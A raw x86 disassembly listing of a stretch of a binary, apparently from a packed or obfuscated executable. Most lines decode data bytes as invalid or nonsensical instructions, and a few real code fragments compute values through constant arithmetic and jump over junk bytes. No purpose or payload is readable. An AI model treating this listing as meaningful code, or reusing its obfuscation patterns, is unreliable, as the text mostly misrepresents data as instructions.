  4186cc:	data16 (bad) 
  4186cf:	repz int 0x88
  4186d2:	fwait
  4186d3:	daa    
  4186d4:	in     eax,0x44
  4186d6:	jnp    0x41870f
  4186d8:	js     0x41868f
  4186da:	aam    0x31
  4186dc:	xchg   ebp,eax
  4186dd:	jbe    0x418701
  4186df:	cmc    
  4186e0:	sahf   
  4186e1:	js     0x418749
  4186e3:	pop    ss
  4186e4:	xchg   si,ax
  4186e6:	jne    0x4186fd
  4186e8:	retw   0x96fb
  4186ec:	sbb    BYTE PTR [edi+ebx*8+0x45],ch
  4186f0:	jle    0x4186ff
  4186f2:	retf   0x96e1
  4186f5:	fbstp  TBYTE PTR [edx]
  4186f8:	ror    cl,1
  4186fa:	ret    0x4404
  4186fd:	inc    eax
  4186fe:	push   ss
  4186ff:	lahf   
  418700:	push   0x45
  418702:	sub    BYTE PTR [ebx],bh
  418704:	pop    esi
  418705:	adc    DWORD PTR ds:0x3167561,ecx
  41870b:	out    dx,eax
  41870c:	sbb    edx,DWORD PTR [esp+ebp*1+0x7154fc21]
  418713:	pop    esp
  418714:	sub    esp,0xfffffff0
  418717:	add    esp,DWORD PTR [edi+0x55]
  41871a:	or     al,0xb4
  41871c:	enter  0xc673,0x5c
  418720:	push   es
  418721:	push   cs
  418722:	outs   dx,BYTE PTR ds:[esi]
  418723:	cli    
  418724:	bound  ebx,QWORD PTR [ebx+0x14]
  418727:	jle    0x41872e
  418729:	mov    ss,ebx
  41872b:	fldenv [ebx]
  41872d:	cmp    BYTE PTR [ecx-0x29d06f60],bh
  418733:	fistp  DWORD PTR [ebp+0x54a60e8e]
  418739:	pop    edx
  41873a:	jg     0x4186d9
  41873c:	mov    ah,0xc9
  41873e:	popa   
  41873f:	lock pushf 
  418741:	fidivr DWORD PTR [edx-0x29]
  418744:	push   edx
  418745:	xchg   ebx,eax
  418746:	jmp    0x1761:0x263e391
  41874d:	je     0x41872a
  41874f:	fs sti 
  418751:	(bad)  
  418752:	and    eax,DWORD PTR [ebp-0x74]
  418755:	sahf   
  418756:	push   cs
  418757:	push   ss
  418758:	cli    
  418759:	stc    
  41875a:	mov    al,0x3a
  41875c:	mov    bl,0x4a
  41875e:	(bad)  
  41875f:	push   ss
  418760:	je     0x418781
  418762:	lods   eax,DWORD PTR ds:[esi]
  418763:	into   
  418764:	mov    DWORD PTR [esi],edx
  418766:	pop    ebx
  418767:	sub    dh,BYTE PTR [edi]
  418769:	loopne 0x4187cc
  41876b:	test   BYTE PTR [ebx-0x62],0x86
  41876f:	xchg   edx,eax
  418770:	mov    eax,0x4d1172ae
  418775:	mov    dh,cl
  418777:	cld    
  418778:	mov    ds:0xe470958e,eax
  41877d:	fdiv   QWORD PTR [edi+0x24dc6ea1]
  418783:	into   
  418784:	call   0x3f28:0x8fbec6d8
  41878b:	cwde   
  41878c:	add    ebx,0xc5a7ff3e
  418792:	loopne 0x418789
  418794:	call   0xe7ea:0x84ef0189
  41879b:	inc    ebp
  41879c:	js     0x418757
  41879e:	stos   DWORD PTR es:[edi],eax
  41879f:	es push ebp
  4187a1:	sbb    al,0x9a
  4187a3:	ret    0x1f17
  4187a6:	repnz adc edi,DWORD PTR [eax]
  4187a9:	test   BYTE PTR ds:0xceaee87,dl
  4187af:	shl    BYTE PTR [ebx-0x4565137d],1
  4187b5:	mov    eax,0xf06168ec
  4187ba:	mov    fs,esi
  4187bc:	in     al,dx
  4187bd:	into   
  4187be:	hlt    
  4187bf:	lds    ebx,FWORD PTR [esi+0x3f11a4ba]
  4187c5:	cmc    
  4187c6:	push   ecx
  4187c7:	out    0xb7,al
  4187c9:	in     eax,dx
  4187ca:	ficomp WORD PTR cs:[edx]
  4187cd:	push   0xffffff97
  4187cf:	pop    edi
  4187d0:	in     eax,dx
  4187d1:	jle    0x418755
  4187d3:	jmp    0x41881c
  4187d5:	sub    al,0x76
  4187d7:	sbb    DWORD PTR [edi],ebx
  4187d9:	(bad)  
  4187da:	pop    ds
  4187db:	inc    ecx
  4187dc:	mov    al,0xd0
  4187de:	lea    eax,[edi]
  4187e0:	or     DWORD PTR ds:0x395f19f3,0xffffffeb
  4187e7:	jae    0x4187cd
  4187e9:	inc    eax
  4187ea:	xchg   ebx,eax
  4187eb:	ror    BYTE PTR [edi+eax*4+0x24],0x5b
  4187f0:	daa    
  4187f1:	add    cl,BYTE PTR [eax+0xe]
  4187f4:	jge    0x418836
  4187f6:	lea    ebx,[edi+0x1b]
  4187f9:	gs mov ebp,0x21210c02
  4187ff:	xchg   ebx,eax
  418800:	mov    bl,0x49
  418802:	fdivr  DWORD PTR [edi]
  418804:	out    0xf,eax
  418806:	inc    ebx
  418807:	mov    DWORD PTR [edi-0x7a],esp
  41880a:	test   ax,0x241a
  41880e:	stos   BYTE PTR es:[edi],al
  41880f:	dec    ebx
  418810:	ret    
  418811:	add    DWORD PTR [esi+0x6e85c236],edx
  418817:	xchg   esi,eax
  418818:	hlt    
  418819:	ins    BYTE PTR es:[edi],dx
  41881a:	and    esp,DWORD PTR [esi-0x53b0d4b6]
  418820:	ret    
  418821:	push   cs
  418822:	add    eax,0x7f1638ec
  418827:	pop    ebx
  418828:	call   FWORD PTR [ebx-0x41ff17bd]
  41882e:	sahf   
  41882f:	push   ebx
  418831:	pop    edi
  418832:	neg    BYTE PTR [ebx-0x17]
  418835:	add    DWORD PTR [edi],eax
  418837:	popf   
  418838:	or     DWORD PTR [ecx+0x46dbd8e],esi
  41883e:	stc    
  41883f:	mov    al,0xc2
  418841:	scas   eax,DWORD PTR es:[edi]
  418842:	in     al,dx
  418843:	pop    esp
  418844:	sbb    DWORD PTR [eax],edi
  418846:	mov    cl,0x1c
  418848:	xchg   ebx,eax
  418849:	icebp  
  41884a:	bound  ebx,QWORD PTR [edx+ecx*1+0x2c]
  41884e:	dec    esi
  41884f:	mov    al,0xc2
  418851:	mov    al,0xf2
  418853:	repz jmp 0x97c0:0x14726593
  41885b:	inc    esi
  41885c:	or     DWORD PTR [ebx+0xc],esp
  41885f:	aad    0x3f
  418861:	lock mov edx,0xabb8310f
  418867:	xchg   ebx,eax
  418868:	mov    bh,0x4a
  41886a:	out    dx,eax
  41886b:	mov    edi,0x162bf651
  418870:	(bad)  
  418871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418872:	cld    
  418873:	call   DWORD PTR [ebx]
  418875:	das    
  418876:	mov    bh,BYTE PTR [edi]
  418878:	(bad)  
  41887a:	clc    
  41887b:	inc    edx
  41887c:	jnp    0x41882f
  41887e:	mov    esp,DWORD PTR [ecx+0x60dfd948]
  418884:	add    eax,0x1204f96f
  418889:	inc    edi
  41888a:	mov    ?,WORD PTR [ecx+0x1d]
  41888d:	mov    dh,0x46
  41888f:	pop    cx
  418891:	je     0x4188b9
  418893:	mov    WORD PTR [edi],es
  418895:	xchg   ah,bh
  418897:	or     al,0xc7
  418899:	lods   al,BYTE PTR ds:[esi]
  41889a:	fisttp WORD PTR [edi]
  41889c:	jnp    0x418906
  41889e:	xchg   ebp,eax
  41889f:	ja     0x418900
  4188a1:	outs   dx,DWORD PTR ds:[esi]
  4188a2:	jbe    0x4188db
  4188a4:	jge    0x4188c4
  4188a6:	xchg   ebx,eax
  4188a7:	add    eax,0xf1a7d6cb
  4188ac:	fldcw  WORD PTR [ebp+0x4f]
  4188af:	mov    eax,0x77e04886
  4188b4:	(bad)  
  4188b5:	aaa    
  4188b6:	fcmovbe st,st(2)
  4188b8:	or     esp,0xffffffc7
  4188bb:	dec    esp
  4188bc:	ret    
  4188bd:	inc    esp
  4188be:	out    0x86,eax
  4188c0:	inc    eax
  4188c1:	iret   
  4188c2:	mul    esi
  4188c4:	add    edx,ecx
  4188c6:	jb     0x4188e6
  4188cc:	cmp    edx,DWORD PTR [esp+0x10]
  4188d0:	ja     0x4188e6
  4188d6:	jb     0x4188e7
  4188dc:	cmp    eax,DWORD PTR [esp+0xc]
  4188e0:	jbe    0x4188e7
  4188e6:	dec    esi
  4188e7:	xor    edx,edx
  4188e9:	mov    eax,esi
  4188eb:	pop    esi
  4188ec:	pop    ebx
  4188ed:	ret    0x10
  4188f0:	push   ebp
  4188f1:	mov    ebp,esp
  4188f3:	sub    esp,0x20
  4188f6:	push   esi
  4188f7:	push   edi
  4188f8:	mov    DWORD PTR [ebp-0x10],0x5
  4188ff:	mov    DWORD PTR [ebp-0xc],0x59eb
  418906:	mov    DWORD PTR [ebp-0x8],0xf6
  41890d:	mov    DWORD PTR [ebp-0x14],0x70c6
  418914:	mov    DWORD PTR [ebp-0x4],0x3835
  41891b:	mov    DWORD PTR [ebp-0x20],0x7bf0
  418922:	mov    eax,ds:0x422564
  418927:	mov    ecx,DWORD PTR ds:0x422560
  41892d:	mov    esi,DWORD PTR [ebp-0x4]
  418930:	add    eax,0x3c30
  418935:	or     ecx,eax
  418937:	mov    eax,ds:0x422568
  41893c:	xor    esi,0x65a0
  418942:	or     esi,eax
  418944:	mov    eax,DWORD PTR [ebp-0x8]
  418947:	jmp    0x418cae
  41894c:	add    DWORD PTR [ecx-0x1],ebx
  41894f:	mov    bh,0x97
  418951:	mov    ebp,0x252e7db9
  418956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418957:	outs   dx,DWORD PTR ds:[esi]
  418958:	inc    edx
  418959:	ror    DWORD PTR [ecx+0x5],0xe4
  41895d:	sbb    cl,al
  41895f:	mov    ebx,0xbbbbc546
  418964:	xor    edi,ecx
  418966:	fist   WORD PTR [eax]
  418968:	outs   dx,DWORD PTR ds:[esi]
  418969:	mov    dh,0x5
  41896b:	retf   
  41896c:	push   ss
  41896d:	lods   al,BYTE PTR ds:[esi]
  41896e:	mov    ds:0x73592612,al
  418973:	mov    gs,WORD PTR [esi+edi*4]
  418976:	ror    DWORD PTR [ebx+ecx*8-0x348a962e],0x52
  41897e:	(bad)  
  41897f:	out    dx,al
  418980:	lods   eax,DWORD PTR ds:[esi]
  418981:	xor    BYTE PTR [eax+0x7c],0xf8
  418985:	pop    edi
  418986:	add    ah,BYTE PTR [ebx+0x30de3c2e]
  41898c:	ret    0xcd86
  41898f:	mov    ds:0xf175971d,al
  418994:	add    al,0x2f
  418996:	int    0xf0
  418998:	mov    eax,esp
  41899a:	mov    cl,0x36
  41899c:	(bad)  
  41899d:	arpl   WORD PTR [ecx+0x2d0abdc9],di
  4189a3:	cmp    al,0x7e
  4189a5:	xchg   ebp,eax
  4189a6:	scas   eax,DWORD PTR es:[edi]
  4189a7:	jae    0x4189d5
  4189a9:	ss or  edx,0xb5563ffb
  4189b0:	sub    dh,BYTE PTR [ecx+edx*1+0x36]
  4189b4:	sub    al,0xb2
  4189b6:	lods   eax,DWORD PTR ds:[esi]
  4189b7:	shl    BYTE PTR [edx-0x286d7c0a],cl
  4189bd:	imul   ecx,esp,0xfc8ce057
  4189c3:	mov    dl,0x10
  4189c5:	jb     0x41898b
  4189c7:	(bad)  
  4189c9:	xchg   ebx,ecx
  4189cb:	mov    al,0x56
  4189cd:	add    eax,0x9bc0393e
  4189d2:	(bad)  
  4189d4:	dec    esp
  4189d5:	sub    BYTE PTR [ebx-0x61429309],0x7f
  4189dc:	pop    ds
  4189dd:	mov    esi,0x3d90d4ff
  4189e2:	pusha  
  4189e3:	jg     0x4189ee
  4189e5:	jne    0x4cf9f843
  4189eb:	and    BYTE PTR [ecx+0x4c],dl
  4189ee:	in     eax,0xf2
  4189f0:	xor    DWORD PTR [ebx+0x68],0xc3aeffce
  4189f7:	mov    DWORD PTR [ebx-0x3b],esp
  4189fa:	retf   
  4189fb:	(bad)  
  4189fc:	call   0x915f:0x89e89d92
  418a03:	outs   dx,DWORD PTR ds:[esi]
  418a04:	or     esp,DWORD PTR [ecx]
  418a06:	sub    BYTE PTR [ebx+0x4f],ch
  418a09:	pop    es
  418a0a:	dec    esi
  418a0b:	shl    DWORD PTR [ecx],1
  418a0d:	xchg   esp,eax
  418a0e:	int    0xdf
  418a10:	push   0x30e8b5dd
  418a15:	mov    ds:0x4d706d9,eax
  418a1a:	pop    ss
  418a1b:	js     0x4189b1
  418a1d:	in     al,dx
  418a1e:	jno    0x418a7f
  418a20:	pop    eax
  418a21:	test   eax,0x28f61ec4
  418a26:	int    0x4f
  418a28:	inc    esi
  418a29:	lods   eax,DWORD PTR ds:[esi]
  418a2a:	fadd   QWORD PTR [edx]
  418a2c:	pop    ebp
  418a2d:	cmp    DWORD PTR [edi-0x56],eax
  418a30:	(bad)  
  418a31:	xor    eax,0x1756e081
  418a36:	cmpxchg BYTE PTR [edx-0x43],bh
  418a3a:	adc    DWORD PTR [ebx+esi*2],esi
  418a3d:	int3   
  418a3e:	pop    ds
  418a3f:	mov    ebx,0x205d8100
  418a44:	and    esi,edx
  418a46:	sbb    BYTE PTR [esi+0x6ec96b1b],ch
  418a4c:	add    DWORD PTR [ebx+0x6c],edx
  418a4f:	dec    ebx
  418a50:	mov    al,ds:0x1aaee7be
  418a55:	xchg   dl,ah
  418a57:	shl    bh,1
  418a59:	jmp    0x418aca
  418a5b:	shr    DWORD PTR [ebx+eax*8+0x22],1
  418a5f:	loope  0x418a2f
  418a61:	dec    ecx
  418a62:	in     eax,dx
  418a63:	cld    
  418a64:	into   
  418a65:	xchg   DWORD PTR [edx-0x69],ecx
  418a68:	push   ss
  418a69:	bound  edi,QWORD PTR [edi+esi*1-0x1a4e1a5e]
  418a70:	mov    ebx,0xacdc073d
  418a75:	cmp    al,0xec
  418a77:	jns    0x418aae
  418a79:	loope  0x418a7a
  418a7b:	cmp    BYTE PTR [eax-0x5d],bl
  418a7e:	popf   
  418a7f:	test   BYTE PTR [eax+0x28795a17],0xda
  418a86:	push   eax
  418a87:	lods   al,BYTE PTR ds:[esi]
  418a88:	mov    esi,0x571cb36e
  418a8d:	addr16 js 0x418af5
  418a90:	ss cmp al,0xf1
  418a93:	into   
  418a94:	cmp    ch,BYTE PTR [esi+0x4e]
  418a97:	and    BYTE PTR [edi+eiz*8],al
  418a9a:	mov    eax,0x57e0cbb3
  418a9f:	out    0x75,al
  418aa1:	or     BYTE PTR [ebx-0x38ef4267],bl
  418aa7:	ss mov ebx,0x8600af3
  418aad:	js     0x418a4c
  418aaf:	pop    ss
  418ab0:	test   BYTE PTR [eax+0x6e34e4c9],dl
  418ab6:	push   esi
  418ab7:	lods   eax,DWORD PTR ds:[esi]
  418ab8:	jmp    0x1f78:0x4566d59a
  418abf:	cmc    
  418ac0:	or     BYTE PTR [eax+0x171a9019],bl
  418ac6:	aad    0x3b
  418ac8:	and    edx,ecx
  418aca:	les    ebp,FWORD PTR [edx]
  418acc:	and    bl,cl
  418ace:	cmp    eax,DWORD PTR [ecx-0x18]
  418ad1:	and    BYTE PTR [ebp-0x53],0x8f
  418ad5:	popf   
  418ad6:	xor    BYTE PTR [ebp-0x5b],cl
  418ad9:	int    0xc5
  418adb:	jne    0x418ac0
  418add:	sub    dl,BYTE PTR [esi-0x590c6f6b]
  418ae3:	das    
  418ae4:	adc    eax,0xe38324a5
  418ae9:	dec    esp
  418aea:	push   0x8a4d92ba
  418aef:	addr16 push esi
  418af1:	and    eax,0xa44c5f49
  418af6:	add    esp,DWORD PTR [edi]
  418af8:	and    eax,ecx
  418afa:	push   0x51
  418afc:	pop    ebx
  418afd:	aaa    
  418afe:	xchg   edx,eax
  418aff:	ret    0xeec3
  418b02:	int3   
  418b03:	into   
  418b04:	push   ebp
  418b05:	bound  esi,QWORD PTR [ebp+0x3d3165e5]
  418b0b:	pusha  
  418b0c:	mov    bh,0x2d
  418b0e:	call   0xccd1:0x79600fd4
  418b15:	pop    eax
  418b16:	sahf   
  418b17:	add    eax,0x21120de7
  418b1c:	in     al,dx
  418b1d:	lods   eax,DWORD PTR ds:[esi]
  418b1e:	mov    bl,BYTE PTR [edx+0x4f]
  418b21:	addr16 test esp,edi
  418b24:	pop    ebp
  418b25:	nop
  418b26:	fisttp QWORD PTR [edx+edi*1+0x3900b04f]
  418b2d:	jns    0x418b47
  418b2f:	fistp  QWORD PTR [ebx+0x5b]
  418b32:	and    esp,ebx
  418b34:	cli    
  418b35:	and    al,0x64
  418b37:	fwait
  418b38:	dec    ebp
  418b39:	push   edx
  418b3a:	mov    dh,0xb6
  418b3c:	imul   esp,DWORD PTR [ebp-0x69aa634a],0xffffffc3
  418b43:	cmp    DWORD PTR [ebx+0x566f9b3f],0xffffffc0
  418b4a:	imul   eax,DWORD PTR [ebp+0x7e],0xd3f8e9fc
  418b51:	jo     0x418bc2
  418b53:	push   ebp
  418b54:	out    dx,al
  418b55:	outs   dx,BYTE PTR ds:[esi]
  418b56:	ror    DWORD PTR ds:0x2f03882f,0x17
  418b5d:	mov    bl,0x53
  418b5f:	push   eax
  418b60:	pop    esp
  418b61:	sub    eax,0x542fff4d
  418b66:	and    BYTE PTR [ebx-0x11],ch
  418b69:	out    0x48,al
  418b6b:	sub    ebx,esp
  418b6d:	ja     0x418b74
  418b6f:	adc    al,0x61
  418b71:	sub    esi,DWORD PTR [edx+0x38420485]
  418b77:	rol    BYTE PTR [eax+0x6c],1
  418b7a:	retf   0x9e3e
  418b7d:	sub    DWORD PTR [esi],0xffffff96
  418b80:	popa   
  418b81:	fmul   DWORD PTR [ebp+0x2f066bb]
  418b87:	push   edx
  418b88:	sub    esi,DWORD PTR [edi-0x7e4a6751]
  418b8e:	lea    edx,[ebx]
  418b90:	(bad)  
  418b91:	sbb    eax,0x3ce6f636
  418b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b97:	push   ds
  418b98:	sub    esi,DWORD PTR [ebx]
  418b9a:	ja     0x418bde
  418b9c:	xchg   esp,eax
  418b9d:	push   es
  418b9e:	inc    eax
  418b9f:	or     bh,cl
  418ba1:	dec    ebp
  418ba2:	xor    dl,al
  418ba4:	cmp    BYTE PTR [edi+0x57],dl
  418ba7:	cmp    edx,DWORD PTR [eax]
  418ba9:	ja     0x418bc1
  418bab:	aam    0x94
  418bad:	pop    es
  418bae:	fcom   st(4)
  418bb0:	bound  edx,QWORD PTR [edi-0x67ad2ee7]
  418bb6:	loope  0x418c31
  418bb8:	gs pop ss
  418bba:	popf   
  418bbb:	rol    BYTE PTR [ebx-0x4891f258],1
  418bc1:	push   eax
  418bc2:	dec    eax
  418bc3:	dec    ecx
  418bc4:	fstp   DWORD PTR [edx+eiz*4-0x27]
  418bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bc9:	stc    
  418bca:	sti    
  418bcb:	(bad)  
  418bcc:	fcmovu st,st(0)
  418bce:	push   0x79
  418bd0:	mov    bl,0x7b
  418bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bd3:	in     al,0x52
  418bd5:	test   eax,0xff604d9a
  418bda:	test   eax,0x8fa528ce
  418bdf:	mov    esi,0x40282938
  418be4:	clc    
  418be5:	mov    cl,BYTE PTR [esi+0xbc3f5d]
  418beb:	pop    esp
  418bec:	(bad)  
  418bee:	hlt    
  418bef:	add    eax,0x6a77cc57
  418bf4:	lods   eax,DWORD PTR ds:[esi]
  418bf5:	and    dl,BYTE PTR [ebx+ecx*8]
  418bf8:	push   ebp
  418bf9:	aam    0xec
  418bfb:	(bad)
  418bfe:	push   ebp
  418bff:	aaa    
  418c00:	cmp    DWORD PTR [edi-0x1a],eax
  418c03:	(bad)  
  418c04:	push   edi
  418c05:	cmp    edi,DWORD PTR [edi+eiz*1+0x4e]
  418c09:	inc    ecx
  418c0a:	mov    BYTE PTR [ebx],dl
  418c0c:	cmc    
  418c0d:	xor    eax,0x6999c7f7
  418c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c13:	jle    0x418bfe
  418c15:	nop
  418c16:	arpl   WORD PTR ds:0x9d03d91f,cx
  418c1c:	sub    BYTE PTR [ebx-0x4c38accd],al
  418c22:	ins    DWORD PTR es:[edi],dx
  418c23:	inc    edi
  418c24:	add    esi,DWORD PTR [esi+0x7133d8f0]
  418c2a:	repz mov eax,0xbc43b7d3
  418c30:	jne    0x418c7d
  418c32:	adc    al,0xbd
  418c34:	mov    al,0xae
  418c36:	cmc    
  418c37:	add    DWORD PTR [esp+esi*8+0x5e527f43],eax
  418c3e:	or     eax,0x88d71885
  418c43:	(bad)  
  418c44:	jmp    0xea12:0xb4757011
  418c4b:	inc    esp
  418c4c:	es or  eax,0x52f367f4
  418c52:	aaa    
  418c53:	add    BYTE PTR [esi+edi*2+0x2eeb9ebe],0x77
  418c5b:	fst    QWORD PTR [edx+ebx*2]
  418c5e:	jns    0x418c1a
  418c60:	(bad)  
  418c61:	cwde   
  418c62:	or     al,0xa7
  418c64:	sub    eax,0x1a14905b
  418c69:	fwait
  418c6a:	in     eax,0xa5
  418c6c:	int3   
  418c6d:	(bad)  
  418c6e:	icebp  
  418c6f:	jge    0x418c15
  418c71:	add    edx,DWORD PTR ds:0x843bfa8
  418c77:	nop
  418c78:	pop    eax
  418c79:	sbb    al,0x1c
  418c7b:	js     0x418c4c
  418c7d:	xlat   BYTE PTR ss:[ebx]
  418c7f:	daa    
  418c80:	aaa    
  418c81:	hlt    
  418c82:	cmp    DWORD PTR [edi+0x57],edi
  418c85:	and    bl,BYTE PTR [ebx]
  418c87:	pop    eax
  418c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c89:	and    DWORD PTR [esi-0x61a76de7],ebp
  418c8f:	(bad)  
  418c90:	cmc    
  418c91:	(bad)  
  418c93:	arpl   dx,bx
  418c95:	loope  0x418c46
  418c97:	fisttp QWORD PTR [edi-0x76]
  418c9a:	loope  0x418c55
  418c9c:	jo     0x418c92
  418c9e:	sub    edi,eax
  418ca0:	jnp    0x418d19
  418ca2:	push   ebp
  418ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ca4:	(bad)  
  418ca5:	pop    ss
  418ca6:	adc    al,0x19
  418ca8:	xchg   BYTE PTR [esi+0x70],dh
  418cab:	sub    eax,0x450323e4
  418cb0:	hlt    
  418cb1:	mov    edi,DWORD PTR [ebp-0x10]
  418cb4:	xor    edx,edx
  418cb6:	div    edi
  418cb8:	xor    edx,edx
  418cba:	mov    edi,0x56fd
  418cbf:	push   0x20
  418cc1:	add    ecx,0x42ab
  418cc7:	xor    ecx,0xa9f0
  418ccd:	or     eax,0x54f5
  418cd2:	div    edi
  418cd4:	pop    edx
  418cd5:	mov    edi,0x4d0
  418cda:	sub    edx,eax
  418cdc:	mov    eax,DWORD PTR [ebp-0x14]
  418cdf:	and    eax,esi
  418ce1:	mov    esi,ecx
  418ce3:	sub    esi,eax
  418ce5:	add    esi,edi
  418ce7:	cmp    esi,edx
  418ce9:	ja     0x419112
  418cef:	push   ebx
  418cf0:	mov    DWORD PTR [ebp-0x1c],0x283d
  418cf7:	mov    DWORD PTR [ebp-0x18],0x7d2d
  418cfe:	mov    eax,ds:0x422578
  418d03:	mov    edx,DWORD PTR [ebp-0x18]
  418d06:	imul   eax,eax,0xf9
  418d0c:	add    eax,0xffffbe51
  418d11:	imul   edx,eax
  418d14:	mov    eax,DWORD PTR [ebp-0x1c]
  418d17:	xor    edx,eax
  418d19:	xor    edx,0x88cf2efc
  418d1f:	mov    eax,ecx
  418d21:	sub    eax,edx
  418d23:	mov    DWORD PTR [ebp-0x1c],eax
  418d26:	mov    eax,ds:0x422574
  418d2b:	xor    edx,edx
  418d2d:	push   0xb
  418d2f:	jmp    0x419096
  418d34:	jns    0x418d7c
  418d36:	fild   WORD PTR [ebp-0x4946520b]
  418d3c:	dec    eax
  418d3d:	std    
  418d3e:	(bad)  
  418d40:	inc    edi
  418d41:	jno    0x418cca
  418d43:	das    
  418d44:	jno    0x418d60
  418d46:	sar    DWORD PTR [ebx-0x44443aba],0x23
  418d4d:	mov    ebp,0xebea58f9
  418d52:	inc    esp
  418d53:	jns    0x418db5
  418d55:	push   cs
  418d56:	outs   dx,BYTE PTR ds:[esi]
  418d57:	mov    edx,0x35e048be
  418d5c:	call   0x2745:0xfa4be5bf
  418d63:	arpl   si,cx
  418d65:	hlt    
  418d66:	aaa    
  418d67:	repnz les ebx,FWORD PTR ds:0xde7c8ae
  418d6e:	or     ecx,esp
  418d70:	xor    eax,0x771a1237
  418d75:	mov    dl,0xa2
  418d77:	ret    
  418d78:	add    eax,DWORD PTR [esp+ebx*8+0x61]
  418d7c:	mov    dl,dh
  418d7e:	in     eax,0x8f
  418d80:	out    0x63,al
  418d82:	pop    es
  418d83:	mov    bl,0x5
  418d85:	sub    al,0x16
  418d87:	push   ebx
  418d88:	jns    0x418da0
  418d8a:	gs jns 0x418dd8
  418d8d:	jge    0x418d52
  418d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d90:	js     0x418d98
  418d92:	(bad)  [edx-0x28]
  418d95:	imul   ebx,ebx,0x7f
  418d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d99:	mov    dl,0x19
  418d9b:	fdiv   QWORD PTR [eax+0x64]
  418d9e:	cwde   
  418d9f:	stos   BYTE PTR es:[edi],al
  418da0:	jns    0x418d79
  418da2:	or     ah,BYTE PTR [ecx+0x41efdfdd]
  418da8:	or     DWORD PTR [edx+0x1e1575f],ecx
  418dae:	lods   al,BYTE PTR ds:[esi]
  418daf:	sub    DWORD PTR [eax-0xf],ebx
  418db2:	scas   eax,DWORD PTR es:[edi]
  418db3:	lds    ebx,FWORD PTR [eax+0x6c]
  418db6:	mov    eax,eax
  418db8:	pop    esp
  418db9:	jno    0x418dc8
  418dbb:	jmp    0xa98bd00d
  418dc0:	test   al,0xbb
  418dc2:	sti    
  418dc3:	push   edi
  418dc4:	dec    eax
  418dc5:	fs repz push ebp
  418dc8:	jo     0x418ddf
  418dca:	lods   al,BYTE PTR ds:[esi]
  418dcb:	and    esp,DWORD PTR [ebp-0x4a3a64b9]
  418dd1:	jg     0x418e08
  418dd3:	imul   ecx,DWORD PTR [edi],0x4e48a854
  418dd9:	xchg   ebx,eax
  418dda:	xor    DWORD PTR [esi+eiz*4+0x3c],esp
  418dde:	xor    eax,0xf45ddc42
  418de3:	pop    esi
  418de4:	mov    ds:0xe2d80082,eax
  418de9:	imul   eax,DWORD PTR [edx],0x6f4e8a06
  418def:	sbb    al,BYTE PTR [ecx+0x46545751]
  418df5:	dec    esi
  418df6:	mov    esp,0x4e4d116b
  418dfb:	mov    al,0x4f
  418dfd:	jo     0x418e47
  418dff:	cmp    al,0xcb
  418e01:	les    eax,FWORD PTR [ecx]
  418e03:	int    0xe9
  418e05:	popf   
  418e06:	pop    ss
  418e07:	cmp    eax,0xd7f2eb83
  418e0c:	mov    BYTE PTR [ebx-0xd6883e4],ah
  418e12:	inc    edi
  418e13:	inc    eax
  418e14:	(bad)
  418e18:	mov    ebp,0xec2b33d4
  418e1d:	(bad)  
  418e1e:	mov    ch,0x18
  418e20:	jl     0x418e70
  418e22:	add    dh,bl
  418e24:	dec    ebx
  418e25:	sbb    BYTE PTR ds:0x81430555,dl
  418e2b:	in     al,dx
  418e2c:	pop    edx
  418e2d:	push   ss
  418e2e:	fidiv  WORD PTR [edx-0x3d]
  418e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e32:	scas   eax,DWORD PTR es:[edi]
  418e33:	adc    cl,BYTE PTR [ecx+0x3d]
  418e36:	dec    esp
  418e37:	fwait
  418e38:	jg     0x418eb9
  418e3a:	(bad)  
  418e3b:	(bad)  
  418e3c:	sbb    al,0xf9
  418e3e:	pop    edx
  418e3f:	push   cs
  418e40:	das    
  418e41:	lahf   
  418e42:	pop    es
  418e43:	ja     0x418df5
  418e45:	mov    ds:0x5e2af940,al
  418e4a:	push   ss
  418e4b:	or     BYTE PTR [esi+0x27ceded8],dl
  418e51:	mov    edi,0x21bbea41
  418e56:	xor    eax,0x15c106b9
  418e5b:	dec    edx
  418e5c:	call   0xca10:0xea406ae7
  418e63:	lods   al,BYTE PTR ds:[esi]
  418e64:	in     eax,0x97
  418e66:	out    dx,eax
  418e67:	stc    
  418e68:	inc    edx
  418e69:	jbe    0x418e9c
  418e6b:	(bad)  
  418e6c:	in     eax,0x49
  418e6e:	push   ss
  418e6f:	sub    edi,eax
  418e71:	cmp    BYTE PTR [edi-0x3e3270ae],al
  418e77:	mov    gs,WORD PTR [ebx+ebp*1+0x48426ac7]
  418e7e:	inc    edi
  418e7f:	sbb    al,0x32
  418e81:	jp     0x418e04
  418e83:	stos   DWORD PTR es:[edi],eax
  418e84:	cmp    ebp,DWORD PTR [ecx]
  418e86:	ja     0x418e71
  418e88:	push   ds
  418e89:	xchg   esi,eax
  418e8a:	inc    eax
  418e8b:	cli    
  418e8c:	fdiv   DWORD PTR [ecx+0x650ecc74]
  418e92:	sbb    esi,0x67
  418e95:	iret   
  418e96:	aas    
  418e97:	fistp  WORD PTR [ebp+0x5]
  418e9a:	fld    QWORD PTR [esi-0x1d]
  418e9d:	sahf   
  418e9e:	aas    
  418e9f:	lods   eax,DWORD PTR ds:[esi]
  418ea0:	loopne 0x418efe
  418ea2:	rcr    BYTE PTR [esi-0x1e],0x4b
  418ea6:	pop    es
  418ea7:	sahf   
  418ea8:	pop    esi
  418ea9:	outs   dx,BYTE PTR ds:[esi]
  418eaa:	(bad)  
  418eab:	hlt    
  418eac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ead:	ins    DWORD PTR es:[edi],dx
  418eae:	jmp    0x7be6:0xe8014fa2
  418eb5:	cmp    BYTE PTR [ebp+0x273ce9c8],bl
  418ebb:	mov    esp,0xa0eb2f3d
  418ec0:	push   esi
  418ec1:	sbb    DWORD PTR [eax+0x37],ebp
  418ec4:	(bad)  [edx+0x37f720df]
  418eca:	mov    bl,0x24
  418ecc:	int    0x99
